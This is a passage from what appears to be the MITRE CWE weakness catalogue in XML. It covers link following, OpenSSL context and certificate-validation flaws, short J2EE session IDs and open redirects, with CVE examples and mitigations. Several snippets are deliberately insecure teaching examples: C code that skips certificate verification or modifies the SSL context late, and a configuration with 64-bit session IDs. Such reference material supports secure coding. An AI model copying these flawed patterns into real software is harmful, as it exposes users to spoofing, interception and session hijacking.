                  <xhtml:p>Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file. Ensure good compartmentalization in the system to provide protected areas that can be trusted.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-1999-1386</Reference>
               <Description>Some versions of Perl follows symbolic links when running with the -e option, which allows local users to overwrite arbitrary files via a symlink attack.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1386</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-1178</Reference>
               <Description>Text editor follows symbolic links when creating a rescue copy during an abnormal exit, which allows local users to overwrite the files of other users.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1178</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0217</Reference>
               <Description>Antivirus update allows local users to create or append to arbitrary files via a symlink attack on a logfile.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0217</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0517</Reference>
               <Description>Symlink attack allows local users to overwrite files.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0517</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0689</Reference>
               <Description>Window manager does not properly handle when certain symbolic links point to "stale" locations, which could allow local users to create or truncate arbitrary files.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0689</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1879</Reference>
               <Description>Second-order symlink vulnerabilities</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1879</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1880</Reference>
               <Description>Second-order symlink vulnerabilities</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1880</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1916</Reference>
               <Description>Symlink in Python program</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1916</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0972</Reference>
               <Description>Setuid product allows file reading by replacing a file being edited with a symlink to the targeted file, leaking the result in error messages when parsing fails.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0972</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0824</Reference>
               <Description>Signal causes a dump that follows symlinks.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0824</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1494</Reference>
               <Description>Hard link attack, file overwrite; interesting because program checks against soft links</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1494</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0793</Reference>
               <Description>Hard link and possibly symbolic link following vulnerabilities in embedded operating system allow local users to overwrite arbitrary files.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0793</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0578</Reference>
               <Description>Server creates hard links and unlinks files as root, which allows local users to gain privileges by deleting and overwriting arbitrary files.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0578</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-0783</Reference>
               <Description>Operating system allows local users to conduct a denial of service by creating a hard link from a device special file to a file on an NFS file system.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0783</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1603</Reference>
               <Description>Web hosting manager follows hard links, which allows local users to read or modify arbitrary files.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1603</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1901</Reference>
               <Description>Package listing system allows local users to overwrite arbitrary files via a hard link attack on the lockfiles.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1901</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1111</Reference>
               <Description>Hard link race condition</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1111</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0342</Reference>
               <Description>Mail client allows remote attackers to bypass the user warning for executable attachments such as .exe, .com, and .bat by using a .lnk file that refers to the attachment, aka "Stealth Attachment."</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0342</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1042</Reference>
               <Description>FTP server allows remote attackers to read arbitrary files and directories by uploading a .lnk (link) file that points to the target file.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1042</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1043</Reference>
               <Description>FTP server allows remote attackers to read arbitrary files and directories by uploading a .lnk (link) file that points to the target file.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1043</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0587</Reference>
               <Description>Browser allows remote malicious web sites to overwrite arbitrary files by tricking the user into downloading a .LNK (link) file twice, which overwrites the file that was referenced in the first .LNK file.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0587</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1386</Reference>
               <Description>".LNK." - .LNK with trailing dot</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1386</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-1233</Reference>
               <Description>Rootkits can bypass file access restrictions to Windows kernel directories using NtCreateSymbolicLinkObject function to create symbolic link</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1233</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0725</Reference>
               <Description>File system allows local attackers to hide file usage activities via a hard link to the target file, which causes the link to be recorded in the audit trail instead of the target file.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0725</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0844</Reference>
               <Description>Web server plugin allows local users to overwrite arbitrary files via a symlink attack on predictable temporary filenames.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0844</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>File Processing</Functional_Area>
         </Functional_Areas>
         <Affected_Resources>
            <Affected_Resource>File or Directory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Link Following</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>FIO02-C</Entry_ID>
               <Entry_Name>Canonicalize path names originating from untrusted sources</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>POS01-C</Entry_ID>
               <Entry_Name>Check for the existence of links when dealing with files</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="SEI CERT Perl Coding Standard">
               <Entry_ID>FIO01-PL</Entry_ID>
               <Entry_Name>Do not operate on files that can be modified by untrusted users</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP18</Entry_ID>
               <Entry_Name>Link in resource name resolution</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="132"/>
            <Related_Attack_Pattern CAPEC_ID="17"/>
            <Related_Attack_Pattern CAPEC_ID="35"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 9, &#34;Symbolic Link Attacks&#34;, Page 518"/>
         </References>
         <Notes>
            <Note Type="Relationship">
               <xhtml:p>Link following vulnerabilities are Multi-factor Vulnerabilities (MFV). They are the combination of multiple elements: file or directory permissions, filename predictability, race conditions, and in some cases, a design limitation in which there is no mechanism for performing atomic file creation operations.</xhtml:p>
               <xhtml:p>Some potential factors are race conditions, permissions, and predictability.</xhtml:p>
            </Note>
            <Note Type="Research Gap">UNIX hard links, and Windows hard/soft links are under-studied and under-reported.</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="593" Name="Authentication Bypass: OpenSSL CTX Object Modified after SSL Objects are Created" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The software modifies the SSL context after connection creation has begun.</Description>
         <Extended_Description>If the program modifies the SSL_CTX object after creating SSL objects from it, there is the possibility that older SSL objects created from the original context could all be affected by that change.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="666" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>No authentication takes place in this process, bypassing an assumed protection of encryption.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>The encrypted communication between a user and a trusted host may be subject to a "man in the middle" sniffing attack.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use a language or a library that provides a cryptography framework at a higher level of abstraction.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Most SSL_CTX functions have SSL counterparts that act on SSL-type objects.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Applications should set up an SSL_CTX completely, before creating SSL objects from it.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following example demonstrates the weakness.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>#define CERT "secret.pem"<xhtml:br/>#define CERT2 "secret2.pem"<xhtml:br/>
                     <xhtml:br/>int main(){<xhtml:div style="margin-left:10px;">
                        <xhtml:div>SSL_CTX *ctx;<xhtml:br/>SSL *ssl;<xhtml:br/>init_OpenSSL();<xhtml:br/>seed_prng();<xhtml:br/>
                           <xhtml:br/>ctx = SSL_CTX_new(SSLv23_method());<xhtml:br/>
                           <xhtml:br/>if (SSL_CTX_use_certificate_chain_file(ctx, CERT) != 1)<xhtml:div style="margin-left:10px;">int_error("Error loading certificate from file");</xhtml:div>
                           <xhtml:br/>
                           <xhtml:br/>if (SSL_CTX_use_PrivateKey_file(ctx, CERT, SSL_FILETYPE_PEM) != 1)<xhtml:div style="margin-left:10px;">int_error("Error loading private key from file");</xhtml:div>
                           <xhtml:br/>
                           <xhtml:br/>if (!(ssl = SSL_new(ctx)))<xhtml:div style="margin-left:10px;">int_error("Error creating an SSL context");</xhtml:div>
                           <xhtml:br/>
                           <xhtml:br/>if ( SSL_CTX_set_default_passwd_cb(ctx, "new default password" != 1))<xhtml:div style="margin-left:10px;">int_error("Doing something which is dangerous to do anyways");</xhtml:div>
                           <xhtml:br/>
                           <xhtml:br/>if (!(ssl2 = SSL_new(ctx)))<xhtml:div style="margin-left:10px;">int_error("Error creating an SSL context");</xhtml:div>
                        </xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="94"/>
         </Related_Attack_Patterns>
         
      </Weakness>
      <Weakness ID="599" Name="Missing Validation of OpenSSL Certificate" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The software uses OpenSSL and trusts or uses a certificate without using the SSL_get_verify_result() function to ensure that the certificate satisfies all necessary security requirements.</Description>
         <Extended_Description>This could allow an attacker to use an invalid certificate to claim to be a trusted host, use expired certificates, or conduct other attacks that could be detected if the certificate is properly validated.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="295" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="295" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>The data read may not be properly secured, it might be viewed by an attacker.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>Trust afforded to the system in question may allow for spoofing or redirection attacks.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>If the certificate is not checked, it may be possible for a redirection or spoofing attack to allow a malicious host with a valid certificate to provide data under the guise of a trusted host. While the attacker in question may have a valid certificate, it may simply be a valid certificate for a different site. In order to ensure data integrity, we must check that the certificate is valid, and that it pertains to the site we wish to access.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Ensure that proper authentication is included in the system design.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Understand and properly implement all checks necessary to ensure the identity of entities involved in encrypted communications.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following OpenSSL code ensures that the host has a certificate.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>if (cert = SSL_get_peer_certificate(ssl)) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>// got certificate, host can be trusted</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>//foo=SSL_get_verify_result(ssl);</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>//if (X509_V_OK==foo) ...</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Note that the code does not call SSL_get_verify_result(ssl), which effectively disables the validation step that checks the certificate.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Notes>
            <Note Type="Relationship">CWE-295 and CWE-599 are very similar, although CWE-599 has a more narrow scope that is only applied to OpenSSL certificates. As a result, other children of CWE-295 can be regarded as children of CWE-599 as well. CWE's use of one-dimensional hierarchical relationships is not well-suited to handle different kinds of abstraction relationships based on concepts like types of resources ("OpenSSL certificate" as a child of "any certificate") and types of behaviors ("not validating expiration" as a child of "improper validation").</Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="6" Name="J2EE Misconfiguration: Insufficient Session-ID Length" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The J2EE application is configured to use an insufficient session ID length.</Description>
         <Extended_Description>If an attacker can guess or steal a session ID, then they may be able to take over the user's session (called session hijacking). The number of possible session IDs increases with increased session ID length, making it more difficult to guess or steal a session ID.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="334" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="Java" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>
               <xhtml:p>Session ID's can be used to identify communicating parties in a web environment.</xhtml:p>
               <xhtml:p>The expected number of seconds required to guess a valid session identifier is given by the equation: (2^B+1)/(2*A*S) Where: - B is the number of bits of entropy in the session identifier. - A is the number of guesses an attacker can try each second. - S is the number of valid session identifiers that are valid and available to be guessed at any given time. The number of bits of entropy in the session identifier is always less than the total number of bits in the session identifier. For example, if session identifiers were provided in ascending order, there would be close to zero bits of entropy in the session identifier no matter the identifier's length. Assuming that the session identifiers are being generated using a good source of random numbers, we will estimate the number of bits of entropy in a session identifier to be half the total number of bits in the session identifier. For realistic identifier lengths this is possible, though perhaps optimistic.</xhtml:p>
            </Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>If an attacker can guess an authenticated user's session identifier, they can take over the user's session.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Session identifiers should be at least 128 bits long to prevent brute-force session guessing. A shorter session identifier leaves the application open to brute-force session guessing attacks.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>A lower bound on the number of valid session identifiers that are available to be guessed is the number of users that are active on a site at any given moment. However, any users that abandon their sessions without logging out will increase this number. (This is one of many good reasons to have a short inactive session timeout.) With a 64 bit session identifier, assume 32 bits of entropy. For a large web site, assume that the attacker can try 1,000 guesses per second and that there are 10,000 valid session identifiers at any given moment. Given these assumptions, the expected time for an attacker to successfully guess a valid session identifier is less than 4 minutes. Now assume a 128 bit session identifier that provides 64 bits of entropy. With a very large web site, an attacker might try 10,000 guesses per second with 100,000 valid session identifiers available to be guessed. Given these assumptions, the expected time for an attacker to successfully guess a valid session identifier is greater than 292 years.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-47">
               <Intro_Text>The following XML example code is a deployment descriptor for a Java web application deployed on a Sun Java Application Server. This deployment descriptor includes a session configuration property for configuring the session ID length.</Intro_Text>
               <Example_Code Nature="bad" Language="XML">
                  <xhtml:div>&lt;sun-web-app&gt;<xhtml:div style="margin-left:10px;">...<xhtml:br/>&lt;session-config&gt;<xhtml:div style="margin-left:10px;">&lt;session-properties&gt;<xhtml:div style="margin-left:10px;">&lt;property name="idLengthBytes" value="8"&gt;<xhtml:div style="margin-left:10px;">&lt;description&gt;The number of bytes in this web module's session ID.&lt;/description&gt;</xhtml:div>&lt;/property&gt;</xhtml:div>&lt;/session-properties&gt;</xhtml:div>&lt;/session-config&gt;<xhtml:br/>...</xhtml:div>&lt;/sun-web-app&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>This deployment descriptor has set the session ID length for this Java web application to 8 bytes (or 64 bits). The session ID length for Java web applications should be set to 16 bytes (128 bits) to prevent attackers from guessing and/or stealing a session ID and taking over a user's session.</Body_Text>
               <Body_Text>Note for most application servers including the Sun Java Application Server the session ID length is by default set to 128 bits and should not be changed. And for many application servers the session ID length cannot be changed from this default setting. Check your application server documentation for the session ID length default setting and configuration options to ensure that the session ID length is set to 128 bits.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>J2EE Misconfiguration: Insufficient Session-ID Length</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="21"/>
            <Related_Attack_Pattern CAPEC_ID="59"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-482"/>
         </References>
         
      </Weakness>
      <Weakness ID="601" Name="URL Redirection to Untrusted Site ('Open Redirect')" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks.</Description>
         <Extended_Description>An http parameter may contain a URL value and could cause the web application to redirect the request to the specified URL. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts have a more trustworthy appearance.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="20" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Paradigm Name="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>Phishing is a general term for deceptive attempts to coerce private information from users that will be used for identity theft.</Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Open Redirect</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Cross-site Redirect</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Cross-domain Redirect</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Low</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>The user may be redirected to an untrusted page that contains malware which may then compromise the user's machine. This will expose the user to extensive risk and the user's interaction with the web server may also be compromised if the malware conducts keylogging or other attacks that steal credentials, personally identifiable information (PII), or other important data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Other</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Other</Impact>
               <Note>The user may be subjected to phishing attacks by being redirected to an untrusted page. The phishing attack may point to an attacker controlled web page that appears to be a trusted web site. The phishers may then steal the user's credentials and then use these credentials to access the legitimate web site.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-10">
               <Method>Manual Static Analysis</Method>
               <Description>Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Dynamic Analysis</Method>
               <Description>Automated black box tools that supply URLs to every input may be able to spot Location header modifications, but test case coverage is a factor, and custom redirects may not be detected.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>Automated static analysis tools may not be able to determine whether input influences the beginning of a URL, which is important for reducing false positives.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Other</Method>
               <Description>Whether this issue poses a vulnerability will be subject to the intended behavior of the application. For example, a search engine might intentionally provide redirects to arbitrary URLs.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>Use a whitelist of approved URLs or domains to be used for redirection.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use an intermediate disclaimer page that provides the user with a clear warning that they are leaving the current site. Implement a long timeout before the redirect occurs, or force the user to click on the link. Be careful to avoid XSS problems (CWE-79) when generating the disclaimer page.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21.2">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>
                  <xhtml:p>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</xhtml:p>
